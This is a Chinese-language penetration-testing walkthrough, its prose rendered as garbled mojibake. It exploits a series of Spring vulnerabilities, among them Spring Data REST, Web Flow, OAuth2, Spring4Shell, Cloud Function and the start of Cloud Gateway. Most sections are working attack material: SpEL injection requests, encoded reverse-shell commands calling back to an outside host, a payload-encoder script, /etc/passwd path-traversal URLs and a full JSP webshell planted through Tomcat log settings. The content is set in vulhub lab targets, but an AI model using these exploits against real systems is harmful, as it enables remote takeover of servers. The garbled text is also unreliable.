restfulæ˜¯ä¸€ç§è½¯ä»¶æ¶æ„é£æ ¼ã€è®¾è®¡é£æ ¼ï¼Œè€Œä¸æ˜¯æ ‡å‡†ï¼Œåªæ˜¯æä¾›äº†ä¸€ç»„è®¾è®¡åŸåˆ™å’Œçº¦æŸæ¡ä»¶ã€‚å®ƒä¸»è¦ç”¨äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨äº¤äº’ç±»çš„è½¯ä»¶ã€‚åŸºäºè¿™ä¸ªé£æ ¼è®¾è®¡çš„è½¯ä»¶å¯ä»¥æ›´ç®€æ´ï¼Œæ›´æœ‰å±‚æ¬¡ï¼Œæ›´æ˜“äºå®ç°ç¼“å­˜ç­‰æœºåˆ¶ã€‚restfulå…³é”®æ˜¯å®šä¹‰å¯è¡¨ç¤ºæµç¨‹å…ƒç´ /èµ„æºçš„å¯¹è±¡ã€‚åœ¨RESTä¸­ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éƒ½æ˜¯é€šè¿‡URLæ¥è¡¨ç¤ºçš„ï¼Œå¯¹è±¡ç”¨æˆ·è´Ÿè´£å°†çŠ¶æ€ä¿¡æ¯æ‰“åŒ…è¿›æ¯ä¸€æ¡æ¶ˆæ¯å†…ï¼Œä»¥ä¾¿å¯¹è±¡çš„å¤„ç†æ€»æ˜¯æ— çŠ¶æ€çš„ã€‚

reståŸç†åŒ…æ‹¬

  *   *   *   *   *   *   * 

    
    
    ç³»ç»Ÿä¸Šçš„ä¸€åˆ‡å¯¹è±¡éƒ½è¦æŠ½è±¡ä¸ºèµ„æºï¼›  
    æ¯ä¸ªèµ„æºå¯¹åº”å”¯ä¸€çš„èµ„æºæ ‡è¯†ï¼ˆURIï¼‰ï¼›  
    å¯¹èµ„æºçš„æ“ä½œä¸èƒ½æ”¹å˜èµ„æºæ ‡è¯†ï¼ˆURIï¼‰æœ¬èº«ï¼›  
    æ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯æ— çŠ¶æ€çš„ç­‰ç­‰ã€‚

æŒ‡çº¹å°±æ˜¯ç½‘é¡µå…¨æ˜¯json,é‡Œé¢æœ‰ä¸€äº›ç±»  

è®¿é—®customers/1

![]()

 **3.3 poc**  

PATCHçš„å€¼æ˜¯ SpELè¡¨è¾¾å¼ï¼Œæ·»åŠ è¯·æ±‚å¤´ä¸ºContent-Typeï¼šapplication/json-patch+json
ï¼Œè€Œä¸”å‘½ä»¤éœ€è¦æ”¹ä¸º10è¿›åˆ¶ç¼–ç ã€‚ **  
**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    PATCH /customers/1 HTTP/1.1 Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/json-patch+jsonContent-Length: 202  
    [  { "op": "replace",     "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,120,77,105,52,120,78,68,107,118,78,122,99,122,77,121,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname",    "value": "exploit"   }]

æ¯”å¦‚ping dnsåœ°å€è¿™æ ·å†™

![]()

è½¬åŒ–ä¸ºåè¿›åˆ¶çš„æ—¶å€™å¯ä»¥ç”¨è¿™æ¡å‘½ä»¤

    
    
    ",".join(map(str, (map(ord,"bash -c {echo,xxx}|{base64, -d}|{bash, -i}"))))

![]()

ç„¶åbpå‘åŒ…å°±è¡Œäº†  

getshellåŒç†

bash -i >& /dev/tcp/192.168.233.131/7777 0>&1

![]()

  

  * 

    
    
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4xMzEvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}

  

  * 

    
    
    ",".join(map(str, (map(ord,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4xMzEvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}"))))

  

![]()

ç„¶åbpå‘åŒ…

![]()

![]()

okä¸‹ä¸€ä¸ª **  
**

 **4.Spring Web Flow RCE(CVE-2017-4971)**

 **4.1æ¼æ´ä»‹ç»**

Spring Web
Flowæ˜¯Springçš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œä¸»è¦ç›®çš„æ˜¯è§£å†³è·¨è¶Šå¤šä¸ªè¯·æ±‚çš„ã€ç”¨æˆ·ä¸æœåŠ¡å™¨ä¹‹é—´çš„ã€æœ‰çŠ¶æ€äº¤äº’é—®é¢˜ï¼Œæä¾›äº†æè¿°ä¸šåŠ¡æµç¨‹çš„æŠ½è±¡èƒ½åŠ›ã€‚åœ¨å…¶
2.4.xç‰ˆæœ¬ä¸­ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶äº†æ•°æ®ç»‘å®šæ—¶çš„fieldï¼Œå°†å¯¼è‡´ä¸€ä¸ªSpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œä»è€Œé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚

 **4.2å½±å“èŒƒå›´  
** Spring Web Flow 2.4.0 - 2.4.4

 **4.3æ¼æ´æŒ‡çº¹**  

æ— æ˜æ˜¾æ¼æ´æŒ‡çº¹ï¼Œåœ¨å„ç§æäº¤è¡¨å•çš„åœ°æ–¹å¯ä»¥å°è¯•

 **4.4poc**  

é¶åœºé•¿è¿™æ · **  
**

![]()

  

åœ¨è®¢é˜…å›¾ä¹¦å¤„ï¼Œå­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œç›´æ¥è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼šaddDefaultMappings å’Œ
addModelBindingsã€‚å…¶ä¸­ï¼Œæ§åˆ¶fieldè¿™ä¸ªå€¼çš„å‡½æ•°æ˜¯ addDefaultMappingsï¼Œä¸”æœªåšè¿‡æ»¤ï¼Œè€Œ addModelBindings
æ˜¯ç›´æ¥è·å–çš„javaçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œç”±é…ç½®æ–‡ä»¶ç¡®å®šæ˜¯å¦æœ‰ binder èŠ‚ç‚¹ã€‚å¦‚æœæœ‰ï¼Œå°±æ— æ³•è§¦å‘ä»£ç æ‰§è¡Œã€‚æ‰€ä»¥åˆ©ç”¨æ¡ä»¶æœ‰ä¸¤ä¸ª

 1-MvcViewFactoryCreatorå¯¹è±¡çš„useSpringBeanBindingå‚æ•°éœ€è¦è®¾ç½®ä¸ºfalseï¼ˆé»˜è®¤å€¼ï¼‰ 2-flow view
å¯¹è±¡ä¸­è®¾ç½®BinderConfigurationå¯¹è±¡ä¸ºç©º

æ‰€ä»¥è¿™ä¸ªæ¼æ´è§¦å‘æ¡ä»¶å°±æ˜¯æ‰¾åˆ°è¿™ä¸ªä½ç½®  

    
    
    &_(new java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/ip/port 0>%261")).start()=vulhub

ç™»å½•,ä¸Šé¢å·²ç»ç»™äº†å¯†ç 

![]()

ç„¶åéšä¾¿ç‚¹ä¸€ä¸ªæˆ¿é—´  

![]()

é€‰è´­ç„¶åæäº¤ **  
**

![]()

![]()

ç‚¹å‡»è¿™é‡ŒæŠ“åŒ…,åœ¨åé¢åŠ ä¸Š

    
    
     &_(new java.lang.ProcessBuilder("bash","-c","ping dnslogåœ°å€")).start()=vulhub

![]()

è¿™é‡Œæ³¨æ„è¿™ä¸ªæ˜¯æœ‰csrfçš„tokençš„ï¼Œæ‰€ä»¥é‡æ”¾æ˜¯æ²¡ç”¨çš„,æˆ‘è¿™é‡Œæ˜¯ä¸ºäº†è®©è¯»è€…æ›´ç›´è§‚çš„çœ‹æ¸…æ¥šè¿‡ç¨‹

 **4.5getshell**

  * 

    
    
     &_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/192.168.233.131/6666 0>&1")).start()=vulhub

forwardçš„æ—¶å€™æ”¹åŒ…åŠ ä¸Šè¿™ä¸ª

![]() ****

 **5.Spring Security OAuth2 RCE(CVE-2016-4977)**

 **5.1æ¼æ´ä»‹ç»**

RCEçš„å‰ææ˜¯çŸ¥é“è´¦å·å¯†ç ,Spring Security OAuth2ä¸Šä¸ºSpring æ¡†æ¶æä¾›å®‰å…¨è®¤è¯æ”¯æŒçš„ä¸€ä¸ªæ¨¡å—ï¼Œå½“ä½¿ç”¨Whitelabel
viewsæ¥å¤„ç†é”™è¯¯æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨è¢«æˆæƒçš„æƒ…å†µä¸‹é€šè¿‡æ„é€ æ¶æ„SpELæ¥è¿œç¨‹æ‰§è¡Œå‘½ä»¤

 **5.2å½±å“èŒƒå›´å¦‚**

Spring Security OAuth 2.0 - 2.0.9

Spring Secutiry OAuth 1.0-1.0.5

 **5.3æŒ‡çº¹**

å¦‚æœè®¿é—®

  * 

    
    
    /oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test

å­˜åœ¨ç™»å½•é¡µé¢

![]()

é»˜è®¤è´¦å·å¯†ç æ˜¯admin/admin  

![]()

è€Œä¸”æ˜¾ç¤º54289å°±å­˜åœ¨è¯¥æ¼æ´(233*233=54289)

 **5.4poc**

  *   *   *   *   *   *   * 

    
    
     #!/usr/bin/env pythonmessage = input('Enter message to encode:')poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])for ch in message[1:]:   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) poc += ')}'print(poc)

![]()

å¤åˆ¶ç»“æœ  

  * 

    
    
    ${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)))}

æ‹¼æ¥åˆ°è¿™é‡Œ

  * 

    
    
    oauth/authorize?response_type=${POC}&client_id=acme&scope=openid&redirect_uri=http://test

æ— å›æ˜¾  

![]()

å¯ä»¥xxe,ä¸æ¼”ç¤ºäº†,ç›´æ¥æ„é€ åå¼¹shellæŒ‡ä»¤  

åå¼¹shellå‘½ä»¤åœ¨çº¿ç”Ÿæˆå™¨|ğŸ”°é›¨è‹ğŸ”° (ddosi.org)

å’Œä¸Šé¢ä¸€æ ·

  * 

    
    
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4xMzEvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}

![]()

![]()

æ¥äº†

![]()

  

 **6.Spring Boot ç›®å½•éå†(CVE-2021-21234)**

è¿™é‡Œè‡ªå·±æ­ä¸€ä¸ªvulfocus

  

  *   *   * 

    
    
    git clone https://gitclone.com/github.com/fofapro/vulfocus.git  
    docker pull vulfocus/vulfocus:latest

å®‰è£…å®Œä»¥åæŸ¥çœ‹dockeræ‹‰å»çš„åº“,æŸ¥çœ‹id

  *   * 

    
    
    docker imagesdocker run -d -p 8081:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=(è™šæ‹ŸæœºIP) (IMAGE ID)

![]()

ç„¶åè®¿é—®8081ç«¯å£,admin/adminç™»å½• **  
**

![]()

![]()

ç„¶åå»é•œåƒç®¡ç†ä¸‹è½½é•œåƒå°±è¡Œäº†  

 **6.1æ¼æ´ä»‹ç»**  

è¯´æ˜ï¼šSpring-boot-actuator-logview åœ¨ä¸€ä¸ªåº“ä¸­æ·»åŠ äº†ä¸€ä¸ªç®€å•çš„æ—¥å¿—æ–‡ä»¶æŸ¥çœ‹å™¨ï¼Œä½œä¸ºSpring boot
æ‰§è¡Œå™¨æ–­ç‚¹ã€‚å®ƒæ˜¯MavenåŒ… â€œeu.hinsch:spring-boot-actuator-logviewâ€ã€‚åœ¨0.2.13 ç‰ˆæœ¬ä¹‹å‰çš„Spring-
bott-actuator-logviewä¸­å­˜åœ¨ç›®å½•éå†æ¼æ´ã€‚è¯¥åº“çš„æœ¬è´¨æ˜¯é€šè¿‡ adminï¼ˆspring boot æ‰§è¡Œå™¨ï¼‰HTTP
ç«¯ç‚¹å…¬å¼€æ—¥å¿—æ–‡ä»¶ç›®å½•ã€‚è¦æŸ¥çœ‹çš„æ–‡ä»¶åå’ŒåŸºæœ¬æ–‡ä»¶å¤¹ï¼ˆç›¸å¯¹äºæ—¥å¿—æ–‡ä»¶å¤¹æ ¹ï¼‰éƒ½å¯ä»¥é€šè¿‡è¯·æ±‚å‚æ•°æŒ‡å®šã€‚è™½ç„¶æ£€æŸ¥äº†æ–‡ä»¶åå‚æ•°ä»¥é˜²æ­¢ç›®å½•éå†æ”»å‡»ï¼ˆå› æ­¤filename=../somefile
å°†ä¸èµ·ä½œç”¨ï¼‰ï¼Œä½†æ²¡æœ‰å……åˆ†æ£€æŸ¥åŸºæœ¬æ–‡ä»¶å¤¹å‚æ•°ï¼Œå› æ­¤filename=somefile&base=../ å¯ä»¥è®¿é—®æ—¥å¿—è®°å½•åŸºç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ï¼‰ã€‚è¯¥æ¼æ´å·²åœ¨
0.2.13 ç‰ˆä¸­ä¿®å¤ã€‚0.2.12
çš„ä»»ä½•ç”¨æˆ·éƒ½åº”è¯¥èƒ½å¤Ÿæ¯«æ— é—®é¢˜åœ°è¿›è¡Œæ›´æ–°ï¼Œå› ä¸ºè¯¥ç‰ˆæœ¬ä¸­æ²¡æœ‰å…¶ä»–æ›´æ”¹ã€‚é™¤äº†æ›´æ–°æˆ–åˆ é™¤ä¾èµ–é¡¹ä¹‹å¤–ï¼Œæ²¡æœ‰è§£å†³æ­¤æ¼æ´çš„æ–¹æ³•ã€‚ä½†æ˜¯ï¼Œåˆ é™¤è¿è¡Œåº”ç”¨ç¨‹åºçš„ç”¨æˆ·å¯¹è¿è¡Œåº”ç”¨ç¨‹åºä¸éœ€è¦çš„ä»»ä½•ç›®å½•çš„è¯»å–è®¿é—®æƒé™å¯ä»¥é™åˆ¶å½±å“ã€‚æ­¤å¤–ï¼Œå¯ä»¥é€šè¿‡åœ¨åå‘ä»£ç†åé¢éƒ¨ç½²åº”ç”¨ç¨‹åºæ¥é™åˆ¶å¯¹
logview ç«¯ç‚¹çš„è®¿é—®ã€‚

 **6.2æ¼æ´å½±å“èŒƒå›´**  

spring boot actuator logview < 0.2.13

 **6.3æŒ‡çº¹** **  
**

  1. é¦–é¡µä¸ºok  

  2. oré¦–é¡µä¸ºHellow Spring Boot

![]()

 **6.3exp**  

  *   *   *   *   *   *   *   *   *   *   * 

    
    
     #Windows{{BaseURL}}/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../  
    #Windows{{BaseURL}}/log/view?filename=/windows/win.ini&base=../../../../../../../../../../  
    #Linux{{BaseURL}}/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../  
    #Linux{{BaseURL}}/log/view?filename=/etc/passwd&base=../../../../../../../../../../

![]()

 **7.Spring Data MongoDB SpEL Expression injection(CVE-2022-22980)**

###  **7.1æ¼æ´ç®€ä»‹**

è¯´æ˜ï¼šSpring Data MongoDB åº”ç”¨ç¨‹åºåœ¨ä½¿ç”¨å¸¦æœ‰ SpEL è¡¨è¾¾å¼çš„ @Query æˆ– @Aggregation-annotated
æŸ¥è¯¢æ–¹æ³•æ—¶å®¹æ˜“å—åˆ° SpEL æ³¨å…¥çš„å½±å“ï¼Œå¦‚æœè¾“å…¥æœªç»è¿‡è¿‡æ»¤ï¼Œåˆ™è¯¥è¡¨è¾¾å¼åŒ…å«ç”¨äºå€¼ç»‘å®šçš„æŸ¥è¯¢å‚æ•°å ä½ç¬¦ã€‚

### æœ‰ä¸€ä¸ªå°æ’æ›²,ä»‹ç»ä¸€ä¸‹SpEL

### SpELæ˜¯ä»€ä¹ˆ

SpELæ˜¯åŸºäºSpringçš„ä¸€ä¸ªè¡¨è¾¾å¼è¯­è¨€ï¼Œç±»ä¼¼äºStruts2çš„ OGNLï¼Œèƒ½å¤Ÿåœ¨è¿è¡Œæ—¶åŠ¨æ€æ‰§è¡Œä¸€äº›è¿ç®—æˆ–æŒ‡ä»¤ï¼Œç±»ä¼¼äºJavaçš„åå°„åŠŸèƒ½ã€‚å…±åˆ†ä¸ºä¸‰ç±»ï¼šä¸€.
ç›´æ¥åœ¨æ³¨è§£ä¸­ä½¿ç”¨äºŒ. åœ¨XMLæ–‡ä»¶ä¸­ä½¿ç”¨ä¸‰. åœ¨ä»£ç å—ä¸­ä½¿ç”¨

### SpELèƒ½åšä»€ä¹ˆ

ï¼ˆ1ï¼‰åŸºæœ¬è¡¨è¾¾å¼ï¼š

é€»è¾‘è¿ç®—ã€ä¸‰ç›®è¿ç®—ï¼ˆæ¡ä»¶è¿ç®—ç¬¦ï¼‰ã€æ­£åˆ™è¡¨è¾¾å¼ç­‰ç­‰ã€‚

ï¼ˆ2ï¼‰ç±»æ“ä½œè¡¨è¾¾å¼ï¼š

å¯¹è±¡æ–¹æ³•è°ƒç”¨ã€å¯¹è±¡å±æ€§å¼•ç”¨ã€è‡ªå®šä¹‰å‡½æ•°ã€ç±»å®ä¾‹åŒ–ç­‰ç­‰ã€‚

ï¼ˆ3ï¼‰é›†åˆæ“ä½œè¡¨è¾¾å¼ï¼š

å­—å…¸çš„è®¿é—®ã€æŠ•å½±å’Œä¿®æ”¹ç­‰ç­‰ã€‚

ï¼ˆ4ï¼‰å…¶å®ƒè¡¨è¾¾å¼ï¼š

æ¨¡æ¿è¡¨è¾¾å¼ã€‚

### SpELåŸç†

ï¼ˆ1ï¼‰è¡¨è¾¾å¼ï¼šä¼ å…¥çš„å­—ç¬¦ä¸²å†…å®¹ã€‚

ï¼ˆ2ï¼‰è§£æå™¨ï¼šå°†å­—ç¬¦ä¸²è§£æä¸ºè¡¨è¾¾å¼å†…å®¹ã€‚

ï¼ˆ3ï¼‰ä¸Šä¸‹æ–‡ï¼šè¡¨è¾¾å¼å¯¹è±¡æ‰§è¡Œçš„ç¯å¢ƒã€‚

ï¼ˆ4ï¼‰æ ¹å¯¹è±¡ï¼šé»˜è®¤çš„æ´»åŠ¨ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚

ï¼ˆ5ï¼‰æ´»åŠ¨ä¸Šä¸‹æ–‡å¯¹è±¡ï¼šå½“å‰è¡¨è¾¾å¼æ“ä½œçš„å¯¹è±¡ã€‚

  

 **7.2å½±å“ç‰ˆæœ¬**

Spring Data MongoDB == 3.4.0  
3.3.0 <= Spring Data MongoDB <= 3.3.4

###  **7.3æ¼æ´æŒ‡çº¹**

æ— æ˜æ˜¾æŒ‡çº¹ï¼Œå¦‚æœå­˜åœ¨spring+mongodb çš„ç»„åˆå¯ä»¥ç›²æ‰“ä¸€ä¸‹

 **7.4exp**  

  * 

    
    
     name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('å‘½ä»¤')

è¿™é‡Œçš„nameä¸ºmongodbæ¥å—çš„å‚æ•°

å¦‚

name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('touch
/tmp/bmh')

 **8.Spring Framework RCE(CVE-2022-22965)**

 **8.1** æ¼æ´ç®€ä»‹

Spring
coreæ˜¯Springç³»åˆ—äº§å“ä¸­ç”¨æ¥è´Ÿè´£å‘ç°ã€åˆ›å»ºå¹¶å¤„ç†beanä¹‹é—´çš„å…³ç³»çš„ä¸€ä¸ªå·¥å…·åŒ…ï¼Œæ˜¯ä¸€ä¸ªåŒ…å«Springæ¡†æ¶åŸºæœ¬çš„æ ¸å¿ƒå·¥å…·åŒ…ï¼ŒSpringå…¶ä»–ç»„ä»¶éƒ½è¦ä½¿ç”¨åˆ°è¿™ä¸ªåŒ…ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ­¤æ¼æ´è¿›è¡Œè¿œç¨‹ä»»æ„ä»£ç æ‰§è¡Œã€‚è¯¥æ¼æ´å¹¿æ³›å­˜åœ¨äºSpring
æ¡†æ¶ä»¥åŠè¡ç”Ÿçš„æ¡†æ¶ä¸­ï¼Œå¹¶JDK 9.0åŠä»¥ä¸Šç‰ˆæœ¬ä¼šå—åˆ°å½±å“ã€‚

 **8.2** å½±å“ç‰ˆæœ¬

jdk9+ & SpringåŠå…¶è¡ç”Ÿæ¡†æ¶ & ä½¿ç”¨tomcatéƒ¨ç½²springé¡¹ç›® & ä½¿ç”¨äº†POJOå‚æ•°ç»‘å®š & ï¼ˆSpring Framework
5.3.x - 5.3.18 ï½œ Spring Framework 2.x - 5.2.20ï¼‰

 **8.3æ¼æ´æŒ‡çº¹**  

æ— æ˜æ˜¾æ¼æ´æŒ‡çº¹ï¼Œçœ‹åˆ°è¯†åˆ«åˆ° Spring+Java çš„ç«™å¯ä»¥ç›²æ‰“ä¸€ä¸‹ **  
**

### 8.4EXP

  *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     class.module.classLoader.resources.context.parent.pipeline.first.pattern=æ„å»ºæ–‡ä»¶çš„å†…å®¹  
    class.module.classLoader.resources.context.parent.pipeline.first.suffix=ä¿®æ”¹tomcatæ—¥å¿—æ–‡ä»¶åç¼€  
    class.module.classLoader.resources.context.parent.pipeline.first.directory=å†™å…¥æ–‡ä»¶æ‰€åœ¨çš„ç½‘ç«™æ ¹ç›®å½•  
    class.module.classLoader.resources.context.parent.pipeline.first.prefix=å†™å…¥æ–‡ä»¶åç§°  
    class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=æ–‡ä»¶æ—¥æœŸæ ¼å¼ï¼ˆå®é™…æ„é€ ä¸ºç©ºå€¼å³å¯ï¼‰

å¯ä»¥ä¸€ä¸ªä¸€ä¸ªçš„GETå‘é€ï¼Œæˆ–è€…ç›´æ¥ä¸€æ¬¡æ€§POSTå‘é€ï¼ŒGETå½¢å¦‚ä¸‹é¢è¿™ç§å½¢å¼è¯´æ˜payloadæˆåŠŸ

ä¸¾ä¸ªä¾‹å­  

    
    
    class.module.classLoader.resources.context.parent.pipeline.first.pattern=spring  
    class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp  
    class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT  
    class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell  
    class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

ä¸ç®¡ç”¨getè¿˜æ˜¯postå»å‘  

![]()

æœ€åå»è®¿é—®shell.jspä¼šå‘ç°é‡Œé¢çš„å†…å®¹å°±æ˜¯åˆšæ‰å†™çš„spring

![]()

å†™shell

    
    
    urlç¼–ç å‰çš„webshellï¼š  
    %{c2}i if("t".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i  
      
    urlç¼–ç åçš„webshellï¼š  
    %25%7Bc2%7Di%20if(%22t%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di

æ‰€ä»¥ç°åœ¨åªéœ€è¦æŠŠshell.jspçš„å†…å®¹æ¢æˆä¸‹é¢çš„  

    
    
    class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22t%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di  
    

åŒæ—¶åœ¨è¯·æ±‚ä¸­éœ€è¦åŠ 3ä¸ªheader

    
    
    suffix:%>//  
    c1:Runtime  
    c2:<%

![]()

è®¿é—®shell.jsp?pwd=t&cmd=whoami

 **9.Spring Cloud Function RCE(CVE-2022-22963)**

 **9.1æ¼æ´ä»‹ç»**

è¯´æ˜ï¼šSpring Cloud Function æ˜¯åŸºäºSpring Boot
çš„å‡½æ•°è®¡ç®—æ¡†æ¶ï¼Œå®ƒæŠ½è±¡å‡ºæ‰€æœ‰ä¼ è¾“ç»†èŠ‚å’ŒåŸºç¡€æ¶æ„ï¼Œå…è®¸å¼€å‘äººå‘˜ä¿ç•™æ‰€æœ‰ç†Ÿæ‚‰çš„å·¥å…·å’Œæµç¨‹ï¼Œå¹¶ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘ã€‚ç”±äºSpring Cloud
Functionä¸­RoutingFunctionç±»çš„applyæ–¹æ³•å°†è¯·æ±‚å¤´ä¸­çš„â€œspring.cloud.function.routing-
expressionâ€å‚æ•°ä½œä¸ºSpelè¡¨è¾¾å¼è¿›è¡Œå¤„ç†ï¼Œé€ æˆäº†Spelè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œæœªç»æˆæƒçš„è¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç  ** **ã€‚****

 ** **9.2 **å½±å“ç‰ˆæœ¬******

3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2

 **æŒ‡çº¹**

    
    
    /functionRouter

![]()

 **9.3 exp**

è®¿é—®/functionRouter ä½¿ç”¨POSTå‘åŒ…ï¼Œç„¶ååœ¨headerå¤´é‡Œé¢æ”¾ç½®payload

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /functionRouter HTTP/1.1Host: 192.168.233.131:41407Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closespring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4xMzEvNTU1NSAwPiYx}|{base64,-d}|{bash,-i}")Content-Type: text/plainContent-Length: 6  
    Test  
    

  

ä¸­é—´çš„å‘½ä»¤å°±æ˜¯å½¢å¦‚ --> bash -i >&/dev/tcp/ip/port 0>&1

ä¸¾ä¸ªä¾‹å­

å¦‚æœæ˜¯

    
    
    bash -i >& /dev/tcp/192.168.233.131/5555 0>&1

![]()

äºæ˜¯å‘½ä»¤å˜æˆè¿™æ ·,é™„å¸¦ç¼–ç ç½‘ç«™

java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (bewhale.github.io)

    
    
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4xMzEvNTU1NSAwPiYx}|{base64,-d}|{bash,-i}

![]()

æ¥äº†

![]()

 **10.Spring Cloud Gateway RCE(CVE-2022-22947)**

 **10.1æ¼æ´ä»‹ç»** **  
**

è¯´æ˜ï¼šSpring Cloud
Gatewayæ˜¯Springä¸­çš„ä¸€ä¸ªAPIç½‘å…³ã€‚å…¶3.1.0åŠ3.0.6ç‰ˆæœ¬ï¼ˆåŒ…å«ï¼‰ä»¥å‰å­˜åœ¨ä¸€å¤„SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œå½“æ”»å‡»è€…å¯ä»¥è®¿é—®Actuator
APIçš„æƒ…å†µä¸‹ï¼Œå°†å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ **  
**

å…·ä½“ä»‹ç»å¦‚ä¸‹  

1-gateway ç½‘å…³å¯åŠ¨æ—¶ï¼Œè·¯ç”±ä¿¡æ¯é»˜è®¤ä¼šåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè·¯ç”±ä¿¡æ¯è¢«å°è£…åˆ° RouteDefinition å¯¹è±¡ä¸­ï¼Œé…ç½®å¤šä¸ªRouteDefinition
ç»„æˆ
gatewayçš„è·¯ç”±ç³»ç»Ÿ2-RouteDefinitionLocatoræ˜¯ä¸€ä¸ªæ¥å£ï¼Œåœ¨org.springframework.cloud.gateway.routeåŒ…ä¸‹ï¼Œå¦‚æœæƒ³æŸ¥çœ‹ç½‘å…³ä¸­æ‰€æœ‰çš„è·¯ç”±ä¿¡æ¯ï¼Œè°ƒç”¨æ­¤æ¥å£æ–¹æ³•æ˜¯ä¸€ä¸ªåŠæ³•ï¼Œéœ€è¦å…ˆæ³¨å…¥åˆ°å®¹å™¨ï¼Œ

æ‰€ä»¥è¿™ä¸ªæ´æœ‰ä¸¤ä¸ªå‰æ  

  *   * 

    
    
    management.endpoint.gateway.enabled: truemanagement.endpoints.web.exposure.include: gateway

 **10.2å½±å“ç‰ˆæœ¬**  

pring Cloud Gateway 3.1.0 Spring Cloud Gateway 3.0.0 - 3.0.6 æ—§çš„ä¸å—æ”¯æŒçš„ç‰ˆæœ¬ä¹Ÿå—å½±å“

 **10.3æŒ‡çº¹**  

